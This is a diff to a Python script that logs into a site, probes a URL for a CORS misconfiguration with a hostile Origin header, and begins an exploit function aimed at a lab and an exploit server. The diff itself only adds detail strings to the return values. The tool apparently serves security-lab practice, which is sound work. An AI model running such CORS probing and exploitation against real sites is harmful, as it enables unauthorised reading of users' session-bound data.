@@ -46,7 +46,6 @@ def login_and_get_session(login_url, username, password):
         print(f"[!] Login failed, status code: {response.status_code}")
         print(f"[DEBUG] Response content: {response.content}")
         return None
-
 def check_cors_vulnerability(session, url, evil_origin):
     headers = {
         'Origin': evil_origin,
@@ -59,19 +58,23 @@ def check_cors_vulnerability(session, url, evil_origin):
 
         print(f"[DEBUG] Response Headers: {response.headers}")
 
+        details = f"Origin: {cors_origin}, Credentials: {cors_credentials}"
+
         if cors_origin and cors_credentials:
             if cors_origin == evil_origin and cors_credentials == 'true':
                 print(f"[+] Vulnerable to CORS: {url}")
-                return True
+                return True, details
             else:
                 print(f"[-] Reflecting but not vulnerable: {url}")
-                return False
+                return False, details
         else:
             print(f"[-] No CORS headers present: {url}")
-            return False
+            return False, details
     except requests.RequestException as e:
         print(f"[!] Error: {e}")
-        return False
+        return False, str(e)
+
+
 
 def exploit_cors_vulnerability(lab_url, exploit_server_url):
     exploit_html = f"""
